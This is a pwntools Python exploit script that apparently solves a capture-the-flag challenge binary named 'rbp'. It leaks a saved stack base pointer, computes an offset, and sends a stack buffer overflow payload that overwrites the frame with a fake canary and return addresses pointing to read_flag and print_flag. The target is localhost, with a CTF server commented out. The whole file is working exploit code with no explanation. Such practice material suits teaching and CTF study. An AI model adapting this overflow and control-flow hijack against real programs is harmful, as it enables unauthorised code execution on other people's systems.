#!/usr/bin/env python
from pwn import *

c = remote('localhost', 40002)
#c = remote('club.h4ck3r.quest', 9002)
#c = process("./share/rbp")
elf = ELF("./share/rbp")

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#gdb.attach(c, 'b *0x401331')

# leak rbp
c.sendafter('?', 'a' * 0x10)
c.recvuntil('a' * 0x10)
rbp = u64(c.recv(6) + b'\0' *2)
log.info("rbp: " + hex(rbp))
rbp -= (0xbbf40-0xbbef0) # rbp offset
log.info("new_rbp: " + hex(rbp))


# buffer overflow to rbp
canary = 0x1337
payload = flat({0: rbp, 8: elf.symbols['read_flag'], 0x10: elf.symbols['print_flag'], 0x18: canary, 0x20: rbp})
c.sendafter('!', payload)

#print(c.recvline())
c.interactive()


